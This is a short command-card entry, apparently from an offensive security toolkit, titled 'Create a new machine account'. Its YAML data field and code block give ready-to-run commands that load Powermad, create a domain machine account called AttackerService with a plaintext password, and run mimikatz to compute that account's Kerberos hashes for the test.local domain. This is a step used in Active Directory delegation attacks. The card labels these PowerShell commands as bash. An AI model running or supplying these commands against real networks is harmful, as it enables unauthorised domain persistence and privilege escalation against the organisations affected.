---
id: 79e9f106-c8ac-45b2-a778-547ac144de91
name: Create a new machine account
type: command
executor: bash
data: 'Import-Module .\Powermad\powermad.ps1

  New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString
  ''AttackerServicePassword'' -AsPlainText -Force)

  .\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService
  /domain:test.local" exit'
output: null
created_at: '2023-04-06T03:56:07.951990+00:00'
updated_at: '2023-04-10T20:26:20.679788+00:00'
---

# Create a new machine account

```bash
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
```
